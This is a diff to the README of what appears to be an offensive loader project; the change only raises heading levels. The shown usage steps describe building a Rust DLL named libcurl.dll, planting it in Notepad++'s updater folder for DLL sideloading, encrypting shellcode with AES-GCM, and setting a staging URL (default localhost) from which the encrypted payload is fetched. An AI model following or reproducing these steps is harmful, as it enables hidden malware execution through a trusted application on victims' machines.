@@ -17,25 +17,25 @@
 
 ## Usage
 
-### Compile DLL
+#### Compile DLL
 
 ```rs
 cargo build --release
 ```
 
-### Transfer DLL
+#### Transfer DLL
 
 ```bash
 cp .\target\release\libcurl.dll ..\utils\Notepad++\updater\
 ```
 
-### Encrypt shellcode (Careful to use the same KEY and NONCE)
+#### Encrypt shellcode (Careful to use the same KEY and NONCE)
 
 ```rs
 ./aes-gcm-encryptor.exe <shellcode.bin>
 ```
 
-### Modify staging URL
+#### Modify staging URL
 > Default `http://127.0.0.1/updater.enc`
 
 
